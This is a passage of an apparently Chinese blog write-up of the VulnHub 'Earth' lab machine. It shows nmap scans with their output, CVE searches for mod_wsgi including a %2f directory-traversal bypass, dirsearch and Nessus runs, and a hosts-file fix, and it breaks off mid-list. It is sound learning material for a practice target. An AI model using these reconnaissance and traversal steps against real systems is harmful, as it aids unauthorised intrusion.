<!DOCTYPE html><html lang="zh-CN"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=2"><meta name="theme-color" content="#222"><meta http-equiv="X-UA-COMPATIBLE" content="IE=edge,chrome=1"><meta name="renderer" content="webkit"><link rel="icon" type="image/ico" sizes="32x32" href="/assets/favicon.ico"><link rel="apple-touch-icon" sizes="180x180" href="/assets/apple-touch-icon.png"><link rel="alternate" href="/rss.xml" title="Glad to see U (â—¦Ë™â–½Ë™â—¦)" type="application/rss+xml"><link rel="alternate" href="/atom.xml" title="Glad to see U (â—¦Ë™â–½Ë™â—¦)" type="application/atom+xml"><link rel="alternate" type="application/json" title="Glad to see U (â—¦Ë™â–½Ë™â—¦)" href="https://ctf-learner.github.io/feed.json"><link rel="preconnect" href="https://lf9-cdn-tos.bytecdntp.com"><link rel="preconnect" href="https://at.alicdn.com"><link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Mulish:400,400italic,700,700italic%7CFredericka%20the%20Great:400,400italic,700,700italic%7CNoto%20Serif%20JP:400,400italic,700,700italic%7CNoto%20Serif%20SC:400,400italic,700,700italic%7CInconsolata:400,400italic,700,700italic&amp;display=swap&amp;subset=latin,latin-ext" media="none" onload="this.media='all'"><link rel="stylesheet" href="/css/app.css?v=0.4.2"><link rel="modulepreload" href="/js/chunk-LH3UUIAZ.js"><link rel="modulepreload" href="/js/chunk-QRJM7WWL.js"><link rel="modulepreload" href="/js/chunk-RAMJ2IY5.js"><link rel="modulepreload" href="/js/chunk-S3F4KD3R.js"><link rel="modulepreload" href="/js/chunk-YVJPANCJ.js"><link rel="modulepreload" href="/js/comments-YV65DDGU.js"><link rel="modulepreload" href="/js/index.esm-5SVDFJ47.js"><link rel="modulepreload" href="/js/post-RDTJBKFB.js"><link rel="modulepreload" href="/js/quicklink-JZA437DS.js"><link rel="modulepreload" href="/js/search-QNBO6RKT.js"><link rel="modulepreload" href="/js/siteInit.js"><link rel="stylesheet" href="https://npm.webcache.cn/@waline/client@3.0.0-alpha.11/dist/waline.css" media="none" onload="this.media='all'"><link rel="preload" href="https://s2.loli.net/2024/04/13/rn6eom3xu2ZHWfU.jpg" as="image" fetchpriority="high"><link rel="preload" href="https://s2.loli.net/2024/04/15/K3ONcC86izSgWQB.webp" as="image" fetchpriority="high"><link rel="preload" href="https://cdn.pixabay.com/photo/2016/10/21/14/50/plouzane-1758197_640.jpg" as="image" fetchpriority="high"><link rel="preload" href="https://s2.loli.net/2024/04/15/6RALWQTVwXmUtNu.webp" as="image" fetchpriority="high"><link rel="preload" href="https://s2.loli.net/2024/04/15/wu12NE3xPFzHXGR.webp" as="image" fetchpriority="high"><link rel="preload" href="https://s2.loli.net/2024/04/15/lyKmiwoN5bPLaUd.webp" as="image" fetchpriority="high"><meta name="keywords" content="Penetration Test"><meta name="description" content="Never hack for profit"><link rel="canonical" href="https://ctf-learner.github.io/post/Get-Earth-Shell/"><title>Get Earth Shell</title><meta name="generator" content="Hexo 7.1.1"></head><body itemscope="" itemtype="http://schema.org/WebPage"><div id="loading"><div class="cat"><div class="body"></div><div class="head"><div class="face"></div></div><div class="foot"><div class="tummy-end"></div><div class="bottom"></div><div class="legs left"></div><div class="legs right"></div></div><div class="paw"><div class="hands left"></div><div class="hands right"></div></div></div></div><div id="container"><header id="header" itemscope="" itemtype="http://schema.org/WPHeader"><div class="inner"><div id="brand"><div class="pjax"><h1 itemprop="name headline">Get Earth Shell</h1><div class="meta"><span class="item" title="åˆ›å»ºæ—¶é—´ï¼š2024-05-05 20:45:35"><span class="icon"><i class="ic i-calendar"></i></span><span class="text">å‘è¡¨äº</span><time itemprop="dateCreated datePublished" datetime="2024-05-05T20:45:35+08:00">2024-05-05</time></span><span class="item" title="æœ¬æ–‡å­—æ•°"><span class="icon"><i class="ic i-pen"></i></span><span class="text">æœ¬æ–‡å­—æ•°</span><span>21k</span><span class="text">å­—</span></span><span class="item" title="é˜…è¯»æ—¶é•¿"><span class="icon"><i class="ic i-clock"></i></span><span class="text">é˜…è¯»æ—¶é•¿</span><span>19 åˆ†é’Ÿ</span></span></div></div></div><nav id="nav"><div class="inner"><div class="toggle"><div class="lines" aria-label="åˆ‡æ¢å¯¼èˆªæ "><span class="line"></span><span class="line"></span><span class="line"></span></div></div><ul class="menu"><li class="item title"><a href="/" rel="start">MorIo24's blog</a></li></ul><ul class="right" id="rightNav"><li class="item theme"><i class="ic i-sun"></i></li><li class="item search"><i class="ic i-search"></i></li></ul></div></nav></div><div class="pjax" id="imgs"><ul><li class="item" style="background-image: url(&quot;https://s2.loli.net/2024/04/13/rn6eom3xu2ZHWfU.jpg&quot;);"></li><li class="item" style="background-image: url(&quot;https://s2.loli.net/2024/04/15/K3ONcC86izSgWQB.webp&quot;);"></li><li class="item" style="background-image: url(&quot;https://cdn.pixabay.com/photo/2016/10/21/14/50/plouzane-1758197_640.jpg&quot;);"></li><li class="item" style="background-image: url(&quot;https://s2.loli.net/2024/04/15/6RALWQTVwXmUtNu.webp&quot;);"></li><li class="item" style="background-image: url(&quot;https://s2.loli.net/2024/04/15/wu12NE3xPFzHXGR.webp&quot;);"></li><li class="item" style="background-image: url(&quot;https://s2.loli.net/2024/04/15/lyKmiwoN5bPLaUd.webp&quot;);"></li></ul></div></header><div id="waves"><svg class="waves" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" viewBox="0 24 150 28" preserveAspectRatio="none" shape-rendering="auto"><defs><path id="gentle-wave" d="M-160 44c30 0 58-18 88-18s 58 18 88 18 58-18 88-18 58 18 88 18 v44h-352z"></path></defs><g class="parallax"><use xlink:href="#gentle-wave" x="48" y="0"></use><use xlink:href="#gentle-wave" x="48" y="3"></use><use xlink:href="#gentle-wave" x="48" y="5"></use><use xlink:href="#gentle-wave" x="48" y="7"></use></g></svg></div><main><div class="inner"><div class="pjax" id="main"><div class="article wrap"><div class="breadcrumb" itemlistelement="" itemscope="" itemtype="https://schema.org/BreadcrumbList"><i class="ic i-home"></i><span><a href="/">é¦–é¡µ</a></span><i class="ic i-angle-right"></i><span class="current" itemprop="itemListElement" itemscope="itemscope" itemtype="https://schema.org/ListItem"><a href="/categories/Penetration-Test/" itemprop="item" rel="index" title="åˆ†ç±»äºPenetration Test"><span itemprop="name">Penetration Test<meta itemprop="position" content="0"></span></a></span></div><article class="post block" itemscope="itemscope" itemtype="http://schema.org/Article" lang="zh-CN"><link itemprop="mainEntityOfPage" href="https://ctf-learner.github.io/post/Get-Earth-Shell/"><span hidden="hidden" itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="image" content="/assets/avatar.jpg"><meta itemprop="name" content="MorIo24"><meta itemprop="description" content="Never hack for profit, Never hack for profit"></span><span hidden="hidden" itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="Glad to see U (â—¦Ë™â–½Ë™â—¦)"></span><div class="body md" itemprop="articleBody"><p><span class="label success">ä¸Šæ¬¡æ›´æ–°æ—¶é—´ï¼š2024-05-05</span></p>
<p>è¡Œæ˜Ÿç³»åˆ—é¶æœº â€”â€”â€”Earthã€‚</p>
<p>æ–°æ‰‹çš„ç¬¬äºŒæ¬¡å®æˆ˜ï¼Œå­¦åˆ°çš„éƒ½æ˜¯æ»¡æ»¡çš„çŸ¥è¯†ï¼Œä¸€è·¯ä¸Šèµ°äº†è®¸å¤šå¼¯è·¯ï¼Œä¸è®¤è¯†æ¡†æ¶ï¼Œçœ‹ä¸æ‡‚ Linux çš„æƒé™æœºåˆ¶ï¼Œè¶Šæƒæ—¶æ‰¾ä¸åˆ°æ–¹å‘ç­‰ç­‰ç­‰ç­‰ï¼Œåœ¨æœªçŸ¥ä¸­æ‘¸ç´¢ï¼Œäº«å— blackbox çš„ä¹è¶£ï¼Œæœªæ¥çš„è·¯å¾ˆé•¿ï¼Œè‚©ä¸Šçš„æ‹…å­è¿˜å¾ˆé‡ã€‚</p>
<p><a target="_blank" rel="noopener external nofollow noreferrer" href="https://www.vulnhub.com/entry/the-planets-earth,755/">The Planets: Earth ~ VulnHub</a></p>
<p>Earth é¶æœºä¸‹è½½ï¼š<a target="_blank" rel="noopener external nofollow noreferrer" href="https://download.vulnhub.com/theplanets/Earth.ova">https://download.vulnhub.com/theplanets/Earth.ova</a></p>
<p><img loading="lazy" data-src="/images/Earth%E6%89%93%E9%9D%B6%E8%AE%B0%E5%BD%95.assets/image-20240502230855254.webp" alt="image-20240502230855254"></p>
<p>kali ip åœ°å€ï¼š192.168.81.129</p>
<h1 id="ä¸»æœºå‘ç°"><a class="anchor" href="#ä¸»æœºå‘ç°">#</a> ä¸»æœºå‘ç°</h1>
<p>è€æ ·å­ï¼Œå…ˆ nmap ç®€å•æ‰«ä¸€ä¸‹ï¼š</p>
<figure class="highlight bash"><figcaption data-lang="bash"><span>å¯¹ç…§macåœ°å€å¯»æ‰¾ip</span></figcaption><table><tbody><tr><td data-num="1"></td><td><pre>â””â”€$ nmap <span class="token parameter variable">-sP</span> <span class="token number">192.168</span>.81.0/24</pre></td></tr><tr><td data-num="2"></td><td><pre>Starting Nmap <span class="token number">7</span>.94SVN <span class="token punctuation">(</span> https://nmap.org <span class="token punctuation">)</span> at <span class="token number">2024</span>-05-02 <span class="token number">11</span>:11 EDT</pre></td></tr><tr><td data-num="3"></td><td><pre>Nmap scan report <span class="token keyword">for</span> <span class="token number">192.168</span>.81.1</pre></td></tr><tr><td data-num="4"></td><td><pre>Host is up <span class="token punctuation">(</span><span class="token number">0</span>.0026s latency<span class="token punctuation">)</span>.</pre></td></tr><tr><td data-num="5"></td><td><pre>MAC Address: 00:50:56:C0:00:08 <span class="token punctuation">(</span>VMware<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="6"></td><td><pre>Nmap scan report <span class="token keyword">for</span> <span class="token number">192.168</span>.81.2</pre></td></tr><tr><td data-num="7"></td><td><pre>Host is up <span class="token punctuation">(</span><span class="token number">0</span>.00032s latency<span class="token punctuation">)</span>.</pre></td></tr><tr><td data-num="8"></td><td><pre>MAC Address: 00:50:56:E2:03:BD <span class="token punctuation">(</span>VMware<span class="token punctuation">)</span></pre></td></tr><tr class="marked"><td data-num="9"></td><td><pre>Nmap scan report <span class="token keyword">for</span> <span class="token number">192.168</span>.81.131     <span class="token comment">#  Earth é¶æœº ip åœ°å€</span></pre></td></tr><tr class="marked"><td data-num="10"></td><td><pre>Host is up <span class="token punctuation">(</span><span class="token number">0</span>.00085s latency<span class="token punctuation">)</span>.</pre></td></tr><tr class="marked"><td data-num="11"></td><td><pre>MAC Address: 00:50:56:2B:3B:46 <span class="token punctuation">(</span>VMware<span class="token punctuation">)</span>  <span class="token comment"># å‘ç° mac åœ°å€ï¼Œé”å®šè¿™å°±æ˜¯é¶æœº</span></pre></td></tr><tr><td data-num="12"></td><td><pre>Nmap scan report <span class="token keyword">for</span> <span class="token number">192.168</span>.81.254</pre></td></tr><tr><td data-num="13"></td><td><pre>Host is up <span class="token punctuation">(</span><span class="token number">0</span>.00037s latency<span class="token punctuation">)</span>.</pre></td></tr><tr><td data-num="14"></td><td><pre>MAC Address: 00:50:56:E9:20:9C <span class="token punctuation">(</span>VMware<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="15"></td><td><pre>Nmap scan report <span class="token keyword">for</span> <span class="token number">192.168</span>.81.129</pre></td></tr><tr><td data-num="16"></td><td><pre>Host is up.</pre></td></tr><tr><td data-num="17"></td><td><pre>Nmap done: <span class="token number">256</span> IP addresses <span class="token punctuation">(</span><span class="token number">5</span> hosts up<span class="token punctuation">)</span> scanned <span class="token keyword">in</span> <span class="token number">4.34</span> seconds</pre></td></tr></tbody></table></figure><p>ç„¶åæ·±åº¦æ‰«æä¸€ä¸‹ç«¯å£ï¼š</p>
<figure class="highlight bash"><figcaption data-lang="bash"><span>æ·±åº¦æ‰«æ</span></figcaption><table><tbody><tr><td data-num="1"></td><td><pre>â””â”€$ nmap <span class="token parameter variable">-sV</span> <span class="token parameter variable">-A</span> <span class="token number">192.168</span>.81.131    <span class="token comment">#  -sV -A  æ‰«æç³»ç»Ÿç‰ˆæœ¬å’Œå¼€å¯ç«¯å£çš„æœåŠ¡</span></pre></td></tr><tr><td data-num="2"></td><td><pre>Starting Nmap <span class="token number">7</span>.94SVN <span class="token punctuation">(</span> https://nmap.org <span class="token punctuation">)</span> at <span class="token number">2024</span>-05-02 <span class="token number">11</span>:13 EDT</pre></td></tr><tr><td data-num="3"></td><td><pre>Nmap scan report <span class="token keyword">for</span> <span class="token number">192.168</span>.81.131</pre></td></tr><tr><td data-num="4"></td><td><pre>Host is up <span class="token punctuation">(</span><span class="token number">0</span>.0013s latency<span class="token punctuation">)</span>.</pre></td></tr><tr><td data-num="5"></td><td><pre>Not shown: <span class="token number">987</span> filtered tcp ports <span class="token punctuation">(</span>no-response<span class="token punctuation">)</span>, <span class="token number">10</span> filtered tcp ports <span class="token punctuation">(</span>admin-prohibited<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="6"></td><td><pre>PORT    STATE SERVICE  VERSION</pre></td></tr><tr class="marked"><td data-num="7"></td><td><pre><span class="token number">22</span>/tcp  <span class="token function">open</span>  <span class="token function">ssh</span>      OpenSSH <span class="token number">8.6</span> <span class="token punctuation">(</span>protocol <span class="token number">2.0</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="8"></td><td><pre><span class="token operator">|</span> ssh-hostkey: </pre></td></tr><tr><td data-num="9"></td><td><pre><span class="token operator">|</span>   <span class="token number">256</span> 5b:2c:3f:dc:8b:76:e9:21:7b:d0:56:24:df:be:e9:a8 <span class="token punctuation">(</span>ECDSA<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="10"></td><td><pre><span class="token operator">|</span>_  <span class="token number">256</span> b0:3c:72:3b:72:21:26:ce:3a:84:e8:41:ec:c8:f8:41 <span class="token punctuation">(</span>ED25519<span class="token punctuation">)</span></pre></td></tr><tr class="marked"><td data-num="11"></td><td><pre><span class="token number">80</span>/tcp  <span class="token function">open</span>  http     Apache httpd <span class="token number">2.4</span>.51 <span class="token punctuation">((</span>Fedora<span class="token punctuation">)</span> OpenSSL/1.1.1l mod_wsgi/4.7.1 Python/3.9<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="12"></td><td><pre><span class="token operator">|</span>_http-title: Bad Request <span class="token punctuation">(</span><span class="token number">400</span><span class="token punctuation">)</span>   <span class="token comment">#  apache æœåŠ¡å™¨ python ç‰ˆæœ¬ 3.9</span></pre></td></tr><tr><td data-num="13"></td><td><pre><span class="token operator">|</span>_http-server-header: Apache/2.4.51 <span class="token punctuation">(</span>Fedora<span class="token punctuation">)</span> OpenSSL/1.1.1l mod_wsgi/4.7.1 Python/3.9</pre></td></tr><tr class="marked"><td data-num="14"></td><td><pre><span class="token number">443</span>/tcp <span class="token function">open</span>  ssl/http Apache httpd <span class="token number">2.4</span>.51 <span class="token punctuation">((</span>Fedora<span class="token punctuation">)</span> OpenSSL/1.1.1l mod_wsgi/4.7.1 Python/3.9<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="15"></td><td><pre><span class="token operator">|</span>_ssl-date: TLS randomness does not represent <span class="token function">time</span></pre></td></tr><tr><td data-num="16"></td><td><pre><span class="token operator">|</span>_http-server-header: Apache/2.4.51 <span class="token punctuation">(</span>Fedora<span class="token punctuation">)</span> OpenSSL/1.1.1l mod_wsgi/4.7.1 Python/3.9</pre></td></tr><tr><td data-num="17"></td><td><pre><span class="token operator">|</span> tls-alpn: </pre></td></tr><tr><td data-num="18"></td><td><pre><span class="token operator">|</span>_  http/1.1</pre></td></tr><tr><td data-num="19"></td><td><pre><span class="token operator">|</span>_http-title: Bad Request <span class="token punctuation">(</span><span class="token number">400</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="20"></td><td><pre><span class="token operator">|</span> ssl-cert: Subject: <span class="token assign-left variable">commonName</span><span class="token operator">=</span>earth.local/stateOrProvinceName<span class="token operator">=</span>Space</pre></td></tr><tr class="marked"><td data-num="21"></td><td><pre><span class="token operator">|</span> Subject Alternative Name: DNS:earth.local, DNS:terratest.earth.local   //  æ²¡ä»”ç»†çœ‹å°±æ¼äº†è¿™é‡Œ</pre></td></tr><tr><td data-num="22"></td><td><pre><span class="token operator">|</span> Not valid before: <span class="token number">2021</span>-10-12T23:26:31</pre></td></tr><tr><td data-num="23"></td><td><pre><span class="token operator">|</span>_Not valid after:  <span class="token number">2031</span>-10-10T23:26:31</pre></td></tr><tr><td data-num="24"></td><td><pre>MAC Address: 00:50:56:2B:3B:46 <span class="token punctuation">(</span>VMware<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="25"></td><td><pre>Warning: OSScan results may be unreliable because we could not <span class="token function">find</span> at least <span class="token number">1</span> <span class="token function">open</span> and <span class="token number">1</span> closed port</pre></td></tr><tr><td data-num="26"></td><td><pre>Device type: general purpose<span class="token operator">|</span>storage-misc   <span class="token comment">#  è®¾å¤‡ç±»å‹</span></pre></td></tr><tr class="marked"><td data-num="27"></td><td><pre>Running <span class="token punctuation">(</span>JUST GUESSING<span class="token punctuation">)</span>: Linux <span class="token number">4</span>.X<span class="token operator">|</span><span class="token number">5</span>.X<span class="token operator">|</span><span class="token number">2.6</span>.X<span class="token operator">|</span><span class="token number">3</span>.X <span class="token punctuation">(</span><span class="token number">97</span>%<span class="token punctuation">)</span>, Synology DiskStation Manager <span class="token number">5</span>.X <span class="token punctuation">(</span><span class="token number">90</span>%<span class="token punctuation">)</span>, Netgear RAIDiator <span class="token number">4</span>.X <span class="token punctuation">(</span><span class="token number">87</span>%<span class="token punctuation">)</span>    <span class="token comment">#  ç³»ç»Ÿè¿è¡Œå†…æ ¸ç‰ˆæœ¬</span></pre></td></tr><tr><td data-num="28"></td><td><pre>OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5 cpe:/o:linux:linux_kernel:2.6.32 cpe:/o:linux:linux_kernel:3 cpe:/a:synology:diskstation_manager:5.2 cpe:/o:netgear:raidiator:4.2.28</pre></td></tr><tr><td data-num="29"></td><td><pre>Aggressive OS guesses: Linux <span class="token number">4.15</span> - <span class="token number">5.8</span> <span class="token punctuation">(</span><span class="token number">97</span>%<span class="token punctuation">)</span>, Linux <span class="token number">5.0</span> - <span class="token number">5.4</span> <span class="token punctuation">(</span><span class="token number">97</span>%<span class="token punctuation">)</span>, Linux <span class="token number">5.0</span> - <span class="token number">5.5</span> <span class="token punctuation">(</span><span class="token number">95</span>%<span class="token punctuation">)</span>, Linux <span class="token number">2.6</span>.32 <span class="token punctuation">(</span><span class="token number">91</span>%<span class="token punctuation">)</span>, Linux <span class="token number">3.10</span> - <span class="token number">4.11</span> <span class="token punctuation">(</span><span class="token number">91</span>%<span class="token punctuation">)</span>, Linux <span class="token number">3.2</span> - <span class="token number">4.9</span> <span class="token punctuation">(</span><span class="token number">91</span>%<span class="token punctuation">)</span>, Linux <span class="token number">3.4</span> - <span class="token number">3.10</span> <span class="token punctuation">(</span><span class="token number">91</span>%<span class="token punctuation">)</span>, Linux <span class="token number">5.1</span> <span class="token punctuation">(</span><span class="token number">91</span>%<span class="token punctuation">)</span>, Linux <span class="token number">2.6</span>.32 - <span class="token number">3.10</span> <span class="token punctuation">(</span><span class="token number">91</span>%<span class="token punctuation">)</span>, Linux <span class="token number">2.6</span>.32 - <span class="token number">3.13</span> <span class="token punctuation">(</span><span class="token number">91</span>%<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="30"></td><td><pre>No exact OS matches <span class="token keyword">for</span> <span class="token function">host</span> <span class="token punctuation">(</span>test conditions non-ideal<span class="token punctuation">)</span>.</pre></td></tr><tr><td data-num="31"></td><td><pre>Network Distance: <span class="token number">1</span> hop</pre></td></tr><tr><td data-num="32"></td><td><pre></pre></td></tr><tr><td data-num="33"></td><td><pre>TRACEROUTE</pre></td></tr><tr><td data-num="34"></td><td><pre>HOP RTT     ADDRESS</pre></td></tr><tr><td data-num="35"></td><td><pre><span class="token number">1</span>   <span class="token number">1.29</span> ms <span class="token number">192.168</span>.81.131</pre></td></tr></tbody></table></figure><p>å¾ˆä¸å¹¸ï¼Œ80 ç«¯å£å’Œ 443 ç«¯å£éƒ½æŠ¥ 400ï¼Œå¹¶ä¸”é¶æœºç³»ç»Ÿå†…æ ¸çš„ç‰ˆæœ¬å·ä¹Ÿä¸ç¡®å®šã€‚</p>
<p><img loading="lazy" data-src="/images/Earth%E6%89%93%E9%9D%B6%E8%AE%B0%E5%BD%95.assets/image-20240502232516042.webp" alt="image-20240502232516042"></p>
<p>å‡ºå¸ˆä¸åˆ©ã€‚å…³æ³¨åˆ°æœ‰ä¸€ä¸ªä¸å¯»å¸¸çš„ä½ç½®ğŸ‘‡ï¼š</p>
<p><img loading="lazy" data-src="/images/Earth%E6%89%93%E9%9D%B6%E8%AE%B0%E5%BD%95.assets/image-20240503124531809.webp" alt="image-20240503124531809"></p>
<h1 id="ç»•äº†ä¸€å †å¼¯å­"><a class="anchor" href="#ç»•äº†ä¸€å †å¼¯å­">#</a> ç»•äº†ä¸€å †å¼¯å­</h1>
<p>è¿™ä¸ª mod_wsgi æ˜¯ä¸ªä»€ä¹ˆä¸œè¥¿ï¼Ÿçœ‹çœ‹è¿™é‡ŒğŸ‘‰<a target="_blank" rel="noopener external nofollow noreferrer" href="https://www.liaoxuefeng.com/wiki/1016959663602400/1017805733037760">WSGI æ¥å£ - å»–é›ªå³°çš„å®˜æ–¹ç½‘ç«™ (liaoxuefeng.com)</a></p>
<p>é€šä¿—ç†è§£ï¼šå®é™…ä¸Š WSGI æ˜¯åº•å±‚å¤„ç† TCP è¿æ¥ã€HTTP åŸå§‹è¯·æ±‚å’Œå“åº”æ ¼å¼ç»Ÿä¸€çš„æ¥å£ã€‚Flask åº•å±‚ä½¿ç”¨çš„å°±æ˜¯ WSGI åè®®ã€‚</p>
<p>ç„¶åå»çœ‹çœ‹æœ‰æ²¡æœ‰ä»€ä¹ˆ CVEï¼Œæœå‡ºæ¥ä¸¤ä¸ªç»“æœï¼š</p>
<p>â‘ ç›®å½•ç©¿è¶Šæ¼æ´ï¼Œç”¨ %2f ç»•è¿‡ /ï¼Œå¯ä»¥ä»»æ„æ–‡ä»¶è¯»å–ã€‚ğŸ‘‡</p>
<p><img loading="lazy" data-src="/images/Earth%E6%89%93%E9%9D%B6%E8%AE%B0%E5%BD%95.assets/image-20240503125209575.webp" alt="image-20240503125209575"></p>
<p>è¯•äº†ä¸€ä¸²æ²¡æœ‰ä»€ä¹ˆä½œç”¨ã€‚</p>
<p>â‘¡CVE-2014-0240</p>
<blockquote>
<p>å½“å¯ç”¨å®ˆæŠ¤ç¨‹åºæ¨¡å¼æ—¶ï¼ŒApache çš„ 3.5 ä¹‹å‰çš„ mod_wsgi æ¨¡å—åœ¨æŸäº› Linux å†…æ ¸ä¸Šè¿è¡Œæ—¶æ— æ³•æ­£ç¡®å¤„ç† setuid è¿”å›çš„é”™è¯¯ä»£ç ï¼Œè¿™å…è®¸æœ¬åœ°ç”¨æˆ·é€šè¿‡ä¸æ­£åœ¨è¿è¡Œçš„è¿›ç¨‹æ•°é‡ç›¸å…³çš„å‘é‡è·å¾—æƒé™ã€‚</p>
</blockquote>
<p><img loading="lazy" data-src="/images/Earth%E6%89%93%E9%9D%B6%E8%AE%B0%E5%BD%95.assets/image-20240503130323202.webp" alt="image-20240503130323202"></p>
<p>æœäº†å¥½å¤šï¼Œæ²¡æœ‰å¤ç°æ–‡å­—ï¼Œå¹¶ä¸”è¿˜æ²¡åˆ°è¶Šæƒé‚£ä¸€æ­¥ã€‚msf search ä¹Ÿæ²¡æœ‰æœç´¢åˆ°</p>
<p>åŒæ—¶ dirsearch ä¹Ÿè·‘äº†ä¸€ä¸‹ï¼Œä¾ç„¶ä¸€æ— æ‰€è·ã€‚</p>
<p><img loading="lazy" data-src="/images/Earth%E6%89%93%E9%9D%B6%E8%AE%B0%E5%BD%95.assets/image-20240503130743214.webp" alt="image-20240503130743214"></p>
<p>æ²¡æ‹›äº†ï¼Œç”¨ Nessus è¯•ä¸€ä¸‹ã€‚</p>
<p><img loading="lazy" data-src="/images/Earth%E6%89%93%E9%9D%B6%E8%AE%B0%E5%BD%95.assets/image-20240503185129589.webp" alt="image-20240503185129589"></p>
<p>æ‰“å¼€çœ‹åˆ°æœ‰å‡ ä¸ªé‡å¤§æ¼æ´ï¼Œè¿˜æ˜¯æ²¡æœ‰æ‰¾åˆ°åˆ©ç”¨çš„å…¥å£ã€‚</p>
<h1 id="dnsåŸŸåè§£æé—®é¢˜"><a class="anchor" href="#dnsåŸŸåè§£æé—®é¢˜">#</a> DNS åŸŸåè§£æé—®é¢˜</h1>
<p>åªèƒ½æœä¸€ä¸‹ wpï¼Œæ‰å‘ç°è‡ªå·±é—æ¼äº†è¿™ä¸ªç‚¹ğŸ‘‡<span class="spoiler" title="ä½ çŸ¥é“å¾—å¤ªå¤šäº†">æ²¡ä»€ä¹ˆç»éªŒï¼Œå¤§ä½¬å‹¿å–·</span></p>
<figure class="highlight bash"><figcaption data-lang="bash"><span>ç¬¬å…«è¡ŒDNSè§£æ</span></figcaption><table><tbody><tr><td data-num="1"></td><td><pre><span class="token number">443</span>/tcp <span class="token function">open</span>  ssl/http Apache httpd <span class="token number">2.4</span>.51 <span class="token punctuation">((</span>Fedora<span class="token punctuation">)</span> OpenSSL/1.1.1l mod_wsgi/4.7.1 Python/3.9<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="2"></td><td><pre><span class="token operator">|</span>_ssl-date: TLS randomness does not represent <span class="token function">time</span></pre></td></tr><tr><td data-num="3"></td><td><pre><span class="token operator">|</span>_http-server-header: Apache/2.4.51 <span class="token punctuation">(</span>Fedora<span class="token punctuation">)</span> OpenSSL/1.1.1l mod_wsgi/4.7.1 Python/3.9</pre></td></tr><tr><td data-num="4"></td><td><pre><span class="token operator">|</span> tls-alpn: </pre></td></tr><tr><td data-num="5"></td><td><pre><span class="token operator">|</span>_  http/1.1</pre></td></tr><tr><td data-num="6"></td><td><pre><span class="token operator">|</span>_http-title: Bad Request <span class="token punctuation">(</span><span class="token number">400</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="7"></td><td><pre><span class="token operator">|</span> ssl-cert: Subject: <span class="token assign-left variable">commonName</span><span class="token operator">=</span>earth.local/stateOrProvinceName<span class="token operator">=</span>Space</pre></td></tr><tr class="marked"><td data-num="8"></td><td><pre><span class="token operator">|</span> Subject Alternative Name: DNS:earth.local, DNS:terratest.earth.local   <span class="token operator">!</span><span class="token operator">!</span><span class="token operator">!</span><span class="token operator">!</span><span class="token operator">!</span><span class="token operator">!</span><span class="token operator">!</span><span class="token operator">!</span></pre></td></tr></tbody></table></figure><p>æ‰å‘ç°ç”¨ ip åœ°å€æ˜¯æ— æ³•æ­£å¸¸è®¿é—®ï¼Œéœ€è¦æ·»åŠ  DNS è§£æã€‚</p>
<p>æ‰€ä»¥ä¿®æ”¹ hosts æ–‡ä»¶ï¼ˆæœ¬æœºçš„æˆ–è€… kali çš„ï¼‰ï¼Œè·¯å¾„ï¼š <code>C:\Windows\System32\drivers\etc</code> ï¼ˆ <code>/etc/hosts</code> ï¼‰</p>
<figure class="highlight text"><figcaption data-lang="text"></figcaption><table><tbody><tr><td data-num="1"></td><td><pre>192.168.81.131 earth.local</pre></td></tr><tr><td data-num="2"></td><td><pre>192.168.81.131  terratest.earth.local</pre></td></tr></tbody></table></figure><p><img loading="lazy" data-src="/images/Earth%E6%89%93%E9%9D%B6%E8%AE%B0%E5%BD%95.assets/image-20240503131304539.webp" alt="image-20240503131304539"></p>
<p>ä¿®æ”¹å®Œä¸€èˆ¬ä¼šç«‹å³ç”Ÿæ•ˆï¼Œè‹¥æ²¡ç”Ÿæ•ˆå¯ä»¥åœ¨ powershell æˆ–è€… cmd ä¸­åˆ·æ–° DNS è§£æé…ç½®ï¼š   <code>ipconfig /flushdns</code></p>
<h1 id="åå‘ä»£ç†è¯ä¹¦éªŒè¯"><a class="anchor" href="#åå‘ä»£ç†è¯ä¹¦éªŒè¯">#</a> åå‘ä»£ç†ï¼Ÿï¼è¯ä¹¦éªŒè¯ï¼Ÿï¼</h1>
<p>å‡ºäºå¥½å¥‡æˆ‘ä¹Ÿæœäº†ä¸€ä¸‹åŸå› ï¼š</p>
<p>ğŸ¤–GPT: å¯èƒ½çš„åŸå› æœ‰ğŸ‘‡</p>
<ol>
<li class="lvl-3">
<p><strong>è¯ä¹¦éªŒè¯</strong>ï¼šå¦‚å‰æ‰€è¿°ï¼Œå¦‚æœæœåŠ¡å™¨é…ç½®äº† SSL/TLS è¯ä¹¦ï¼Œå¹¶ä¸”è¯ä¹¦ä¸­åŒ…å«äº†åŸŸåä½œä¸ºä¸»é¢˜å¤‡ç”¨åç§°ï¼ˆSANï¼‰ï¼Œé‚£ä¹ˆä½¿ç”¨åŸŸåè®¿é—®æ—¶ï¼Œæµè§ˆå™¨æˆ–å®¢æˆ·ç«¯èƒ½å¤ŸéªŒè¯æœåŠ¡å™¨çš„èº«ä»½ã€‚è€Œç›´æ¥ä½¿ç”¨ IP åœ°å€è®¿é—®æ—¶ï¼Œç”±äºç¼ºä¹åŸŸåä¿¡æ¯ï¼ŒSSL/TLS è¯ä¹¦çš„éªŒè¯å¯èƒ½ä¼šå¤±è´¥ï¼Œå¯¼è‡´ 400 é”™è¯¯ã€‚</p>
</li>
<li class="lvl-3">
